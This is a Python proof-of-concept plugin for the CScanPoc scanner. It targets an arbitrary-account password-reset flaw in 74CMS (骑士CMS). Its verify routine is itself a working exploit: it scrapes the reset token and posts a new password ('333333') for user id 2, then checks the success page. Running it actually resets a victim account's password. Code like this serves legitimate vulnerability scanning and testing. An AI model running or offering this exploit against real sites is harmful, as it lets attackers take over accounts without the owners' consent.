# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = '74CMS_0003'  # 平台漏洞编号，留空
    name = '骑士CMS 重置任意账号密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-08-31'  # 漏洞公布时间
    desc = '''
        骑士CMS 密码重置机制可以绕过，同时可重置任意账号密码。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0137785'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2e0a2cf0-0fff-45bc-beb3-829525d1597b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0137785
            hh = hackhttp.hackhttp()
            payload1 = "/user/user_getpass.php"
            code, head, res, err, _ = hh.http(self.target + payload1)
            m = re.search('name="token" value="(.*?)"', res, re.I)
            payload2 = '/user/user_getpass.php?act=get_pass_save'
            if m:
                postdata = 'token=' + m.group(1) + '&uid=2&password=333333'
                code, head, res, err, _ = hh.http(
                    self.target + payload2, postdata)
                if code == 302:
                    payload3 = '/user/user_getpass.php?act=get_pass_sucess'
                    code, head, res, err, _ = hh.http(self.target + payload3)
                    if code == 200 and 'icon-success' in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                            target=self.target, name=self.vuln.name, url=(self.target + payload3)))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
